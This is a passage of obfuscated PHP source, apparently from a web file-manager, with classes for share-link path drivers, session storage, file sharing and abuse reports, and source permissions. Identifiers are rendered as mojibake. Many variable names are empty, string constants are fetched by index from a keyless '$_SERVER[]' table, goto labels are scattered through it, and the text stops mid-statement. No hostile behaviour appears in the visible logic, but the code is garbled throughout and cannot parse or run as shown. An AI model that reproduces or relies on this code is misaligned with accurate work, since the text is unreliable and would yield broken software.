$¬© =& $_SERVER[]; $“Å = $this->pathParse[$¬©[452]]; $Â°Ω = trim($this->pathParse[$¬©[1209]], $¬©[18]); return Action($¬©[1380])->sharePathInfo($“Å, $Â°Ω, $); } public function infoFull($»™À•) { $Èç∂ =& $_SERVER[]; $”é = explode($Èç∂[18], trim($»™À•, $Èç∂[18])); if (count($”é) > 1) { $¬í = implode($Èç∂[18], array_splice($”é, 1)); $»• = $this->model->pathInfoByPath($”é[0], $¬í); if (!$»•) { return !1; } $this->pathParse[$Èç∂[1209]] = $»•[$Èç∂[191]]; } return $this->infoParse($»™À•); } public function listAll($…Ü) { $ =& $_SERVER[]; $ = IO::info($this->pathParse[$[94]]); if (!$) { return array(); } $ = $this->model->listAll($…Ü); $√é·úΩ = Model($[641])->getInfo($[$[642]]); foreach ($ as &$) { check_abort(); $[$[97]] = Action($[1380])->_shareItemeParse($[$[97]], $√é·úΩ); } unset($); return $; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($’Ö) { $this->pathParse = $’Ö; $this->model = Model($_SERVER[][1373]); } protected function infoParse($Õó, $ƒπ = false, $ﬁ¶ = false) { $ =& $_SERVER[]; return Action($[1215])->sharePathInfo($this->pathParse[$[94]], !0, $ƒπ); } public function listPath($, $“≠ = false) { $ =& $_SERVER[]; $ = parent::listPath($, $“≠); if (!$) { return $; } if (is_array($[$[1381]])) { $[$[1381]] = Action($[1215])->shareItemInfo($[$[1381]]); } foreach ($ as $¬ïÿâ => $) { if (!in_array($¬ïÿâ, array($[93], $[92]))) { continue; } foreach ($ as $ => $Â≥•) { $[$¬ïÿâ][$] = Action($[1215])->shareItemInfo($Â≥•); } } return $; } public function listAll($) { $«°œî =& $_SERVER[]; $ = IO::info($this->pathParse[$«°œî[94]]); if (!$) { return array(); } $ = $this->model->listAll($); foreach ($ as &$) { $[$«°œî[97]] = Action($«°œî[1215])->shareItemInfo($[$«°œî[97]]); } unset($); return $; } } class PathDriverDriverShareItem { public function __construct($) { $this->pathParse = $; } public function __call($ ™, $) { $ =& $_SERVER[]; if (method_exists($this, $ ™)) { return; } $ = call_user_func_array(array($[1382], $ ™), $); $Î∑â = array($[1383], $[1384], $[1385], $[1386], $[595], $[597], $[1387], $[117], $[1388], $[1389]); if (in_array($ ™, $Î∑â)) { $ = $this->getPathOuter($); } return $; } public function copy($ﬁü, $, $ = false, $Õ∑ = false) { return $this->copyMove($ﬁü, $, $, $_SERVER[][595], $Õ∑); } public function move($, $, $◊ß = false, $ = false) { return $this->copyMove($, $, $◊ß, $_SERVER[][597], $); } private function copyMove($, $ËÜ∫, $“´, $∆æ, $“∫ = false) { $‹∑ =& $_SERVER[]; $ = $ËÜ∫; $‚π≤ = IO::driverMake($ËÜ∫); if ($‚π≤->pathParse[$‹∑[1192]]) { $ËÜ∫ = $‚π≤->pathParse[$‹∑[1192]]; } else { $ËÜ∫ = $; } $≈ô = IO::copyMove($, $ËÜ∫, $“´, $∆æ, $“∫); $≈ô = $this->getPathOuter($≈ô); return $≈ô; } public function pathThis($πóÉ) { return get_path_this($this->pathParse[$_SERVER[][94]]); } public function pathFather($) { return get_path_father($this->pathParse[$_SERVER[][94]]); } public function iconvSystem($‚¨é) { return $‚¨é; } protected function infoParse($ÿ™, $ = false) { $Ë£è =& $_SERVER[]; $€á = $this->pathParse[$Ë£è[537]][$Ë£è[1216]] . $this->pathParse[$Ë£è[1209]]; if ($) { $ = IO::infoWithChildren($€á); } else { $ = IO::info($€á); } $ = $this->pathParse[$Ë£è[537]]; return Action($Ë£è[1380])->_shareItemeParse($, $); } public function listAll($ƒò) { $÷é =& $_SERVER[]; $Õ®Ë†ù = IO::listAll($ƒò); $ﬂΩ = rtrim($this->pathParse[$÷é[537]][$÷é[1216]], $÷é[18]); foreach ($Õ®Ë†ù as &$’Ñ) { $’Ñ[$÷é[94]] = $this->pathDriver . $÷é[18] . ltrim(substr($’Ñ[$÷é[94]], strlen($ﬂΩ)), $÷é[18]); } unset($’Ñ); return $Õ®Ë†ù; } public function listAllSimple($‹†, $ = false) { $ =& $_SERVER[]; $„∂é = $this->listAll($‹†); $–é = $this->pathParse[$[472]]; if (trim($–é, $[18]) == trim(get_path_father($–é), $[18])) { $ = !0; } return IO::init($[22])->listAllSimpleMake($„∂é, $–é, $); } public function getPathOuter($–æ) { $ﬂ• =& $_SERVER[]; $ = KodIO::parse($–æ); if ($[$ﬂ•[43]] == KodIO::KOD_SHARE_ITEM) { return $[$ﬂ•[94]]; } $⁄Ω = KodIO::clear($–æ); $∆† = KodIO::clear($this->pathParse[$ﬂ•[537]][$ﬂ•[1216]]); $ = substr($⁄Ω, strlen($∆†)); if (substr($⁄Ω, 0, strlen($∆†)) != $∆†) { return !1; } return $this->pathParse[$ﬂ•[1210]] . $ﬂ•[18] . ltrim($, $ﬂ•[18]); } public function getType() { $—è =& $_SERVER[]; $ = str_replace($—è[84], $—è[22], get_class($this)); return strtolower($); } public function isTypeObject($) { return IO::isTypeObject($); } public function info($) { return $this->infoParse($); } public function infoAuth($) { return $this->infoParse($); } public function infoWithChildren($) { return $this->infoParse($, !0); } public function infoFull($) { return $this->infoParse($); } } goto Fƒ§; B Ö: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\x6d\x5f\x73\x65\163\163\x69\x6f\x6e"; public function get($—≠‚§è) { $ =& $_SERVER[]; $Ãî = $this->where(array($[2018] => $—≠‚§è))->find(); if (!is_array($Ãî)) { return !1; } return $Ãî[$[794]]; } public function set($Óâí, $◊®, $€öÃ£ = 3600) { $ŸÆ =& $_SERVER[]; $€¶ = array($ŸÆ[2018] => $Óâí, $ŸÆ[1922] => $◊®, $ŸÆ[2019] => $€öÃ£ + time()); if (Session::get($ŸÆ[2020])) { $€¶[$ŸÆ[1685]] = Session::get($ŸÆ[2020]); } else { $€¶[$ŸÆ[1685]] = 0; } if ($this->get($Óâí)) { return $this->where(array($ŸÆ[2018] => $Óâí))->save($€¶); } else { return $this->add($€¶, array(), !0); } } public function remove($ﬂÅ) { return $this->where(array($_SERVER[][2018] => $ﬂÅ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[][2021] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\x65"; protected $dataAuto = array(array("\x6d\157\144\151\x66\171\x54\x69\155\x65", "\164\x69\x6d\145", "\x69\156\163\x65\162\x74\54\165\x70\144\141\164\145", "\x66\x75\x6e\143\164\x69\x6f\156"), array("\x63\x72\145\141\x74\x65\x54\151\x6d\145", "\x74\x69\155\145", "\151\x6e\163\145\162\x74", "\x66\165\156\x63\x74\151\x6f\x6e"), array("\157\x70\164\151\x6f\x6e\163", '', "\151\x6e\163\145\162\164\54\165\x70\144\141\x74\x65\x2c\x73\145\154\145\x63\164", "\x6a\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Õ±) { $ =& $_SERVER[]; $…†Êø• = isset($Õ±[0]) ? $Õ±[0] : !1; return array($[2022] => array(USER_ID, $[2023]), $[1963] => array($…†Êø•, $[2024])); } protected function listSimple() { $÷¶ = array($_SERVER[][1685] => USER_ID); $◊µ = $this->field($this->fieldList)->where($÷¶)->select(); return $◊µ ? $◊µ : array(); } protected function getInfo($, $›∞ = false) { $Õà =& $_SERVER[]; if ($›∞) { return $this->_getShareInfo(array($Õà[642] => $)); } $Û¢Æë = $this->cacheFunctionGet($Õà[1965], $); return $Û¢Æë; } public function getInfoByHash($) { return $this->_getShareInfo(array($_SERVER[][2025] => $)); } public function getInfoByPath($ﬂû) { $ƒû =& $_SERVER[]; $—ß = array($ƒû[1685] => USER_ID, $ƒû[191] => $ﬂû); return $this->_getShareInfo($—ß); } public function getInfoBySourcePath($) { $‚é∞ =& $_SERVER[]; $√∞ = array($‚é∞[1685] => USER_ID, $‚é∞[1216] => $); return $this->_getShareInfo($√∞); } private function _getShareInfo($ƒÑ»ä) { $Ã∫ =& $_SERVER[]; $Ã∂ = $this->where($ƒÑ»ä)->find(); if (!$Ã∂) { return !1; } $ƒÑ»ä = array($Ã∫[642] => $Ã∂[$Ã∫[642]]); $⁄¢ = $Ã∫[2026]; $ƒï = Model($Ã∫[643])->order($Ã∫[452])->field($⁄¢)->where($ƒÑ»ä)->select(); if ($Ã∂[$Ã∫[191]] == $Ã∫[222]) { $Ã∂[$Ã∫[97]] = IO::info($Ã∂[$Ã∫[1216]]); } else { $Ã∂[$Ã∫[97]] = Model($Ã∫[1373])->pathInfo($Ã∂[$Ã∫[191]]); } $Ã∂[$Ã∫[2027]] = $ƒï; return $Ã∂; } protected function getInfoAuth($) { $Õ§ =& $_SERVER[]; $›Ø = $this->getInfo($); if ($›Ø[$Õ§[1685]] == USER_ID) { $›Ø[$Õ§[464]] = $›Ø[$Õ§[97]][$Õ§[464]]; } else { $›Ø[$Õ§[464]] = Model($Õ§[544])->authMake($›Ø[$Õ§[2027]]); } return $›Ø; } protected function listData($Àïﬂ´ = null, $ﬂ´ = 300) { $ÏØ≤ =& $_SERVER[]; $ = array(array($ÏØ≤[539] => array($ÏØ≤[1053], 0), $ÏØ≤[640] => array($ÏØ≤[1053], 0), $ÏØ≤[2028] => $ÏØ≤[1981])); if ($Àïﬂ´ == $ÏØ≤[2029]) { $ = array($ÏØ≤[539] => 1); } else { if ($Àïﬂ´ == $ÏØ≤[1202]) { $ = array($ÏØ≤[640] => 1); } } $[$ÏØ≤[1685]] = USER_ID; $€ì = $this->where($)->selectPage($ﬂ´); return $€ì; } protected function listToMe($≈ë = 300) { $ =& $_SERVER[]; $◊ª = Model($[2030])->userGroupParents(USER_ID); $√ª = array($[625] => SourceModel::TYPE_USER, $[547] => USER_ID); if ($◊ª) { $√ª = array(array($[625] => SourceModel::TYPE_USER, $[547] => USER_ID), array($[625] => SourceModel::TYPE_GROUP, $[547] => array($[17], $◊ª)), $[2028] => $[1981]); } $›∫ = Model($[643])->where($√ª)->selectPage($≈ë); $∆ú–¥ = array_to_keyvalue_group($›∫[$[422]], $[642]); if (!$∆ú–¥) { return $›∫; } $ = $[2031]; $√ª = array($[642] => array($[469], array_keys($∆ú–¥)), $[1685] => array($[1055], $[222])); $ = $this->field($)->where($√ª)->select(); foreach ($ as $Ÿû => &$—Ä÷∫) { $—Ä÷∫[$[2027]] = $∆ú–¥[$—Ä÷∫[$[642]]]; } unset($—Ä÷∫); $”§ = array($[2032] => $, $[2033] => $›∫[$[419]]); return $”§; } protected function shareAdd($, $«´’à) { $ =& $_SERVER[]; $≈ë·ãÉ = $this->_addShareData($, $«´’à); if (!empty($«´’à[$[2034]])) { $this->_shareAuthSet($≈ë·ãÉ, $«´’à[$[2034]]); } $this->shareEventAdd($, $«´’à, $[2035]); return $≈ë·ãÉ; } protected function shareAddSystem($, $) { $Ÿ´ =& $_SERVER[]; $ﬂà = $this->_addShareData($, $, $Ÿ´[189]); $this->_shareAuthSet($ﬂà, $[$Ÿ´[2034]]); return $ﬂà; } private function shareEventAdd($, $ ñ, $·ø© = "\141\x64\x64") { $ÿÖ =& $_SERVER[]; if (!$ || $ == $ÿÖ[222]) { return; } if ($·ø© == $ÿÖ[2035]) { if ($ ñ[$ÿÖ[539]] == $ÿÖ[98]) { Model($ÿÖ[610])->eventShare($, $ÿÖ[2036]); } if ($ ñ[$ÿÖ[640]] == $ÿÖ[98]) { Model($ÿÖ[610])->eventShare($, $ÿÖ[2037]); } return; } $¬Ö = $this->getInfoByPath($); $ = $ÿÖ[2038]; if ($¬Ö[$ÿÖ[539]] == $ÿÖ[222] && $ ñ[$ÿÖ[539]] == $ÿÖ[98]) { $ = $ÿÖ[2036]; } if ($¬Ö[$ÿÖ[539]] == $ÿÖ[98] && $ ñ[$ÿÖ[539]] == $ÿÖ[222]) { $ = $ÿÖ[2039]; } if ($¬Ö[$ÿÖ[640]] == $ÿÖ[222] && $ ñ[$ÿÖ[640]] == $ÿÖ[98]) { $ = $ÿÖ[2037]; } if ($¬Ö[$ÿÖ[640]] == $ÿÖ[98] && $ ñ[$ÿÖ[640]] == $ÿÖ[222]) { $ = $ÿÖ[2040]; } Model($ÿÖ[610])->eventShare($, $); return; } private function _addShareData($, $⁄ã = array(), $„≤∏ = false) { $ =& $_SERVER[]; $Ëù£ = $„≤∏ == $[189] ? 0 : USER_ID; $ = array($[468] => $, $[1676] => $Ëù£); if ($ == 0) { $ = array($[2041] => $⁄ã[$[1216]], $[1676] => $Ëù£); } if ($ = $this->where($)->find()) { return $[$[642]]; } if ($ == 0) { $÷Ö = array($[42] => get_path_this($⁄ã[$[94]])); } else { $÷Ö = Model($[865])->sourceInfo($); if (!$÷Ö) { return !1; } } if (!$⁄ã[$[1582]]) { $⁄ã[$[1582]] = $÷Ö[$[42]]; } $ = array($[1676] => $Ëù£, $[468] => $, $[1582] => $[22], $[539] => 0, $[640] => 0, $[1216] => $[22], $[360] => $[22], $[930] => $[22], $[2042] => 0, $[2043] => 0, $[801] => 0, $[2044] => $[22], $[2025] => $[22]); $ÔÅ† = explode($[60], $[2045]); foreach ($ÔÅ† as $»∫“ñ) { if (!isset($⁄ã[$»∫“ñ])) { continue; } $[$»∫“ñ] = $⁄ã[$»∫“ñ]; } $ = $this->add($); $Ëà™ = array($[2025] => short_id($)); $this->where(array($[2046] => $))->save($Ëà™); return $; } private function _shareAuthSet($ÿø, $◊≤) { $ =& $_SERVER[]; if (!is_array($◊≤)) { return !1; } $⁄ò€í = Model($[1991]); $⁄ò€í->where(array($[642] => $ÿø))->delete(); $≈ª = array(); foreach ($◊≤ as $Àæ) { $»î = SourceModel::TYPE_USER; if ($Àæ[$[188]] == SourceModel::TYPE_GROUP) { $»î = SourceModel::TYPE_GROUP; } $◊Ü = array($[642] => $ÿø, $[188] => $»î, $[547] => intval($Àæ[$[547]]), $[1987] => 0, $[2047] => -1); if ($Àæ[$[1987]]) { $◊Ü[$[1987]] = $Àæ[$[1987]]; } else { if ($Àæ[$[2047]]) { $◊Ü[$[2047]] = $Àæ[$[2047]]; } } $≈ª[] = $◊Ü; } return $⁄ò€í->addAll($≈ª, array(), !0); } public function numViewAdd($) { $Òûæ§ =& $_SERVER[]; $“çÃå = array($Òûæ§[2046] => $); $this->where($“çÃå)->setAdd($Òûæ§[2042]); } public function numDownloadAdd($) { $“ë =& $_SERVER[]; $◊¶ = array($“ë[2046] => $); $this->where($◊¶)->setAdd($“ë[2043]); } protected function shareEdit($Áãû, $) { $Ãë =& $_SERVER[]; $‹ê = $this->getInfo($Áãû); if (!$‹ê) { return !1; } $this->_checkLinkShare($, $‹ê); $ = array(); $Ÿª = explode($Ãë[60], $Ãë[2048]); foreach ($Ÿª as $) { if (!array_key_exists($, $)) { continue; } $[$] = $[$]; } $this->shareEventAdd($‹ê[$Ãë[191]], $, $Ãë[1853]); $this->where(array($Ãë[2046] => $Áãû))->save($); if (isset($[$Ãë[2034]])) { $this->_shareAuthSet($Áãû, $[$Ãë[2034]]); } return !0; } private function _checkLinkShare($, $) { $ =& $_SERVER[]; if ($[$[539]] != $[98]) { return; } $÷∞ = $[$[97]][$[191]]; if ($[$[97]][$[43]] != $[224]) { $ = $this->_folderReport($÷∞); if (!$) { return; } show_json(LNG($[2049]) . $[2050] . $, !1); } $ = Model($[865])->fileInfoGet($[$[97]][$[191]]); if (!$) { return; } $Àô = $this->shareFileMeta($[$[518]]); if (isset($Àô[$[427]]) && $Àô[$[427]] == $[98]) { show_json(LNG($[2051]), !1); } } private function _folderReport($ƒì…¥) { $ =& $_SERVER[]; $√ä⁄Ω = array($[518] => array($[1053], 0), $[790] => 3); $ = Model($[2052])->where($√ä⁄Ω)->field($[518])->select(); if (!$) { return !1; } $ = array_to_keyvalue($, $[22], $[518]); $ = $[60] . $ƒì…¥ . $[60]; $√ä⁄Ω = array($[518] => array($[17], $), $[562] => array($[436], "\x25{$}\x25"), $[482] => 0); $÷≥ = Model($[865])->where($√ä⁄Ω)->field($[2053])->find(); if (!$÷≥) { return !1; } $ = substr($÷≥[$[562]], strpos($÷≥[$[562]], $)); $√ä⁄Ω = array($[191] => array($[17], trim($, $[60]))); $‘ë = Model($[865])->where($√ä⁄Ω)->field($[42])->select(); $Ÿî = array_to_keyvalue($‘ë, $[22], $[42]); $Ÿî[] = $÷≥[$[42]]; return implode($[18], $Ÿî); } protected function remove($ƒ∏⁄Ø) { $ =& $_SERVER[]; if (is_array($ƒ∏⁄Ø)) { $ƒ∏⁄Ø = array($[17], $ƒ∏⁄Ø); } $ = array($[642] => $ƒ∏⁄Ø); $ = $this->where($)->delete(); if ($) { Model($[643])->where(array($[642] => $ƒ∏⁄Ø))->delete(); } $∆ø = is_array($ƒ∏⁄Ø) ? $ƒ∏⁄Ø[1] : array($ƒ∏⁄Ø); for ($ = 0; $ < count($∆ø); $++) { $·êç = $this->getInfo($∆ø[$]); if ($·êç[$[640]] == $[98]) { Model($[610])->eventShare($·êç[$[191]], $[2040]); } if ($·êç[$[539]] == $[98]) { Model($[610])->eventShare($·êç[$[191]], $[2039]); } } return $; } protected function removeBySource($≈¥√ß) { $ÿìÀù =& $_SERVER[]; $‘ô = array($ÿìÀù[468] => array($ÿìÀù[469], $≈¥√ß)); $ = $this->field($ÿìÀù[642])->where($‘ô)->select(); $ = array_to_keyvalue($, $ÿìÀù[22], $ÿìÀù[642]); if (!$) { return; } $‘ô = array($ÿìÀù[2046] => array($ÿìÀù[469], $)); $this->where($‘ô)->delete(); Model($ÿìÀù[643])->where($‘ô)->delete(); } public function listAll($Î≤ß) { $–≤ =& $_SERVER[]; $ = array(); if ($Î≤ß[$–≤[1685]]) { $[$–≤[1685]] = $Î≤ß[$–≤[1685]]; } if ($Î≤ß[$–≤[800]]) { $‘™ = $Î≤ß[$–≤[801]] ? $Î≤ß[$–≤[801]] : strtotime(date($–≤[2054])); $[$–≤[225]] = array($–≤[386], array($Î≤ß[$–≤[800]], $‘™)); } if ($Î≤ß[$–≤[43]]) { $[$Î≤ß[$–≤[43]]] = 1; } else { $[] = array($–≤[539] => array($–≤[1053], 0), $–≤[640] => array($–≤[1053], 0), $–≤[2028] => $–≤[1981]); } if ($Î≤ß[$–≤[1977]]) { $[] = array($–≤[2025] => $Î≤ß[$–≤[1977]], $–≤[1582] => array($–≤[436], "\45{$Î≤ß[$–≤[1977]]}\x25"), $–≤[2028] => $–≤[1981]); } $Õ≤ = $this->_makeOrder()->where($)->selectPage(20); if (empty($Õ≤[$–≤[422]])) { return array(); } $this->_listDataApply($Õ≤[$–≤[422]]); return $Õ≤; } public function listDataApply($) { $this->_listDataApply($); return $; } private function _listDataApply(&$”Æ) { $ =& $_SERVER[]; $⁄ù = array_to_keyvalue($”Æ, $[22], $[1685]); $ = Model($[576])->userListInfo(array_unique($⁄ù)); $Ï≤£ = array_to_keyvalue($”Æ, $[22], $[191]); $ = Model($[865])->sourceListInfo($Ï≤£, !0); foreach ($”Æ as $€£ => &$À∫Àâ) { $‚á® = $À∫Àâ[$[1685]]; $À∫Àâ[$[2055]] = $[$‚á®] ? $[$‚á®] : !1; $ = $À∫Àâ[$[191]]; $À∫Àâ[$[97]] = $[$] ? $[$] : !1; if ($À∫Àâ[$[97]][$[482]] == $[98]) { unset($”Æ[$€£]); } if ($À∫Àâ[$[97]] != $[222] && !$À∫Àâ[$[97]]) { unset($”Æ[$€£]); } } unset($À∫Àâ); $”Æ = array_values($”Æ); } private function _makeOrder($ = '') { $œêÕ∏ =& $_SERVER[]; $◊º = array($œêÕ∏[225], $œêÕ∏[801], $œêÕ∏[2042], $œêÕ∏[2043]); $ = array($œêÕ∏[500] => $œêÕ∏[501], $œêÕ∏[502] => $œêÕ∏[503]); $ = Input::get($œêÕ∏[507], $œêÕ∏[17], $œêÕ∏[474], $◊º); $ = Input::get($œêÕ∏[508], $œêÕ∏[17], $œêÕ∏[2056], array($œêÕ∏[1974], $œêÕ∏[502])); $ = $[$]; $ = $ . "{$}\x20{$}"; return $this->order($); } public function reportAdd($€°) { $ﬁæ‡¨É =& $_SERVER[]; $ﬁì = array($ﬁæ‡¨É[642] => $€°[$ﬁæ‡¨É[642]], $ﬁæ‡¨É[1685] => USER_ID); if (Model($ﬁæ‡¨É[2052])->where($ﬁì)->find()) { return !1; } $Óää = array($ﬁæ‡¨É[642] => $€°[$ﬁæ‡¨É[642]], $ﬁæ‡¨É[1582] => $€°[$ﬁæ‡¨É[1582]], $ﬁæ‡¨É[191] => $€°[$ﬁæ‡¨É[191]], $ﬁæ‡¨É[518] => $€°[$ﬁæ‡¨É[518]], $ﬁæ‡¨É[1685] => USER_ID, $ﬁæ‡¨É[43] => $€°[$ﬁæ‡¨É[43]], $ﬁæ‡¨É[503] => $€°[$ﬁæ‡¨É[503]]); return Model($ﬁæ‡¨É[2052])->add($Óää); } public function reportList($Ã∂) { $’ò‘µ =& $_SERVER[]; $≈™ÈØØ = array(); if ($Ã∂[$’ò‘µ[800]]) { $ ã = $Ã∂[$’ò‘µ[801]] ? $Ã∂[$’ò‘µ[801]] : strtotime(date($’ò‘µ[2054])); $≈™ÈØØ[$’ò‘µ[225]] = array($’ò‘µ[386], array($Ã∂[$’ò‘µ[800]], $ ã)); } if (isset($Ã∂[$’ò‘µ[43]]) && in_array($Ã∂[$’ò‘µ[43]], array($’ò‘µ[98], $’ò‘µ[487], $’ò‘µ[2057], $’ò‘µ[2058], $’ò‘µ[2059]))) { $≈™ÈØØ[$’ò‘µ[43]] = $Ã∂[$’ò‘µ[43]]; } if (isset($Ã∂[$’ò‘µ[790]]) && in_array($Ã∂[$’ò‘µ[790]], array($’ò‘µ[222], $’ò‘µ[98], $’ò‘µ[487], $’ò‘µ[2057]))) { $≈™ÈØØ[$’ò‘µ[790]] = $Ã∂[$’ò‘µ[790]]; } $Ãà = Input::get($’ò‘µ[508], $’ò‘µ[17], $’ò‘µ[2056], array($’ò‘µ[1974], $’ò‘µ[502])); $Êç© = array($’ò‘µ[500] => $’ò‘µ[501], $’ò‘µ[502] => $’ò‘µ[503]); $ = $’ò‘µ[2060] . $Êç©[$Ãà]; $‚Äé = Model($’ò‘µ[2052])->where($≈™ÈØØ)->order($)->selectPage(20); if (empty($‚Äé[$’ò‘µ[422]])) { return array(); } $ﬁÄ‚ÖÅ = array_to_keyvalue_group($‚Äé[$’ò‘µ[422]], $’ò‘µ[790], $’ò‘µ[642]); if (!empty($ﬁÄ‚ÖÅ[0])) { $Ã∂ = $ﬁÄ‚ÖÅ[0]; $≈™ÈØØ = array($’ò‘µ[642] => array($’ò‘µ[17], $Ã∂)); $¬∂”ò = $this->where($≈™ÈØØ)->field($’ò‘µ[642])->select(); $¬∂”ò = array_to_keyvalue($¬∂”ò, $’ò‘µ[22], $’ò‘µ[642]); $ = array_diff($Ã∂, $¬∂”ò); if (!empty($)) { foreach ($‚Äé[$’ò‘µ[422]] as $Õ•«µ => $≈ç) { if (in_array($≈ç[$’ò‘µ[642]], $)) { unset($‚Äé[$’ò‘µ[422]][$Õ•«µ]); } } } } $this->_listDataApply($‚Äé[$’ò‘µ[422]]); return $‚Äé; } public function reportStatus($’Ø) { $ =& $_SERVER[]; $ = array($[452] => $’Ø[$[452]]); $ = Model($[2052])->where($)->field($[2061])->find(); if (!$) { return !1; } $Ê∂æ = array($[790] => $’Ø[$[790]]); if ($’Ø[$[790]] == $[2057] && $[$[790]] == $[2057]) { $Ê∂æ[$[790]] = 0; } $√Ω = Model($[2052])->where($)->save($Ê∂æ); if ($’Ø[$[790]] == $[487]) { if ($[$[518]] != $[222] && $this->shareFileMeta($[$[518]])) { $this->shareFileMeta($[$[518]], 0); } $this->remove($[$[642]]); return !0; } if ($√Ω && $’Ø[$[790]] == $[2057]) { $ = $Ê∂æ[$[790]] == $[2057] ? 1 : 0; $this->shareFileMeta($[$[518]], $); $this->removeByFile($[$[518]]); } return $√Ω; } private function removeByFile($Ãæ) { $—É =& $_SERVER[]; $ÂΩ® = Model($—É[865])->where(array($—É[518] => $Ãæ))->field($—É[191])->select(); $ = array_to_keyvalue($ÂΩ®, $—É[22], $—É[191]); $Œí = array($—É[191] => array($—É[17], $), $—É[539] => 1); $ÂΩ® = $this->where($Œí)->field($—É[642])->select(); if (empty($ÂΩ®)) { return; } $Óßè = array_to_keyvalue($ÂΩ®, $—É[22], $—É[642]); $this->remove($Óßè); } private function shareFileMeta($, $ÿê = null) { $›∂Àé =& $_SERVER[]; $ = array($›∂Àé[518] => $, $›∂Àé[104] => $›∂Àé[2062]); if (is_null($ÿê)) { return Model($›∂Àé[2063])->where($)->find(); } $[$›∂Àé[427]] = $ÿê; Model($›∂Àé[2063])->add($, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\x63\x65\x5f\x61\165\164\x68"; public function getAuth($) { $»º =& $_SERVER[]; $œØ = $this->sourceAuthSelect($); $ = array(); $Ÿï = array(); $ = 2 << 25; foreach ($œØ as $) { $‹∂ = Model($»º[549])->listData($[$»º[1987]]); if (!$‹∂) { continue; } $[] = $; $‘ï = 0; if ($[$»º[188]] == SourceModel::TYPE_GROUP) { $‘ï = $ * 2; } if ($[$»º[188]] == SourceModel::TYPE_USER) { $‘ï = $; } if ($[$»º[188]] == SourceModel::TYPE_USER && $[$»º[547]] == $»º[222]) { $‘ï = 0; } $Ÿï[] = $‹∂[$»º[464]] + $‘ï; } array_multisort($Ÿï, SORT_DESC, $); return $; } public function sourceAuthSelect($) { $ =& $_SERVER[]; static $—¥ = array(); $ = is_array($) ? !1 : !0; if ($) { $ = array($); } $ = array(); foreach ($ as $”≤) { if (isset($—¥[$”≤])) { $[$”≤] = $—¥[$”≤]; } } if (count($) == count($)) { return $ ? $[$[0]] : $; } $ = $[2064]; $›§ = array($[191] => array($[17], $)); $Ã†“¢ = $this->field($)->order($[452])->where($›§)->select(); $ƒ£ = array_to_keyvalue_group($Ã†“¢, $[191]); foreach ($ as $”≤) { $—¥[$”≤] = $ƒ£[$”≤] ? $ƒ£[$”≤] : array(); } if ($) { return $Ã†“¢; } return $ƒ£; } public function setAuth($√ß, $»ø) { $“û =& $_SERVER[]; $◊ì = Model($“û[1373])->sourceInfo($√ß); if (!$◊ì) { return !1; } if ($◊ì[$“û[188]] != SourceModel::TYPE_GROUP) { return !1; } $—Ö = 1; $ƒµ = $◊ì[$“û[547]]; if ($ƒµ != $—Ö) { $‹è = array($“û[1883] => $ƒµ); $€ä = Model($“û[1973])->field($“û[1685])->where($‹è)->select(); $€ä = array_to_keyvalue($€ä, $“û[22], $“û[1685]); } $ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Ÿ§ = array(); foreach ($»ø as $⁄ùËîø) { if (!in_array($⁄ùËîø[$“û[188]], $)) { show_json(LNG($“û[2065]), !1); } if ($ƒµ != $—Ö) { if ($⁄ùËîø[$“û[188]] == SourceModel::TYPE_GROUP) { } if ($⁄ùËîø[$“û[547]] != 0 && !in_array($⁄ùËîø[$“û[547]], $€ä)) { } } if ($⁄ùËîø[$“û[547]] == 0) { $⁄ùËîø[$“û[188]] = SourceModel::TYPE_USER; } $Ÿ§[] = array($“û[191] => $√ß, $“û[188] => intval($⁄ùËîø[$“û[188]]), $“û[547] => intval($⁄ùËîø[$“û[547]]), $“û[1987] => intval($⁄ùËîø[$“û[1987]]) ? intval($⁄ùËîø[$“û[1987]]) : 0, $“û[2047] => intval($⁄ùËîø[$“û[2047]]) ? intval($⁄ùËîø[$“û[2047]]) : -1); } $this->where(array($“û[468] => $√ß))->delete(); $this->addAll($Ÿ§); return !0; } public function authClear($) { $ =& $_SERVER[]; $’ß = Model($[1373])->sourceInfo($); $ = array($); if ($’ß[$[462]] == $[98]) { $ = array($[629] => array($[589], $’ß[$[562]] . $ . $[590])); $ = Model($[1373])->field($[468])->where($)->getField($[191], !0); $[] = $; } $this->where(array($[468] => array($[469], $)))->delete(); return !0; } public function getAllChildren($È©ï) { $Û™Ø∑ =& $_SERVER[]; $ = Model($Û™Ø∑[1373])->sourceInfo($È©ï); if ($[$Û™Ø∑[462]] != $Û™Ø∑[98]) { return $this->sourceListAuth(array($È©ï)); } if ($[$Û™Ø∑[188]] != SourceModel::TYPE_GROUP) { return array(); } $ = 1; $¬ç = array($È©ï); if ($[$Û™Ø∑[190]] == $Û™Ø∑[222] && $[$Û™Ø∑[547]] != $) { $¬ç = $this->groupChidldAllRootSource($[$Û™Ø∑[547]]); } $ = $this->field($Û™Ø∑[191])->group($Û™Ø∑[191])->select(); $ = array_to_keyvalue($, $Û™Ø∑[22], $Û™Ø∑[191]); if (!$) { return array(); } $ﬂ∂ = $Û™Ø∑[2066]; $Ëòâ = array($Û™Ø∑[191] => array($Û™Ø∑[17], $), $Û™Ø∑[482] => $Û™Ø∑[222]); $ﬂ´ = Model($Û™Ø∑[865])->field($ﬂ∂)->where($Ëòâ)->select(); $ÕÜ = array($È©ï); foreach ($ﬂ´ as $ÿ≥) { foreach ($¬ç as $≈£) { $“Ö = $Û™Ø∑[60] . $≈£ . $Û™Ø∑[60]; $ = $ÿ≥[$Û™Ø∑[562]] . $ÿ≥[$Û™Ø∑[191]] . $Û™Ø∑[60]; if (strstr($, $“Ö)) { $ÕÜ[] = $ÿ≥[$Û™Ø∑[191]]; break; } } } return $this->sourceListAuth($ÕÜ); } private function sourceListAuth($) { $ =& $_SERVER[]; $ = Model($[1373])->sourceListInfo($, !0); $ = $this->sourceAuthSelect($); $ = array(); $ = array(); foreach ($ as $) { unset($[$[506]]); unset($[$[504]]); unset($[$[464]]); unset($[$[97]]); $◊ñ = $[$[$[191]]]; if (!$◊ñ) { continue; } $[$[2067]] = $this->authTargetInfo($◊ñ); $[$[560]] = rtrim($[$[566]], $[18]) . $[18] . ltrim($[$[560]], $[18]); $[] = $; $∆£…á = count(explode($[18], 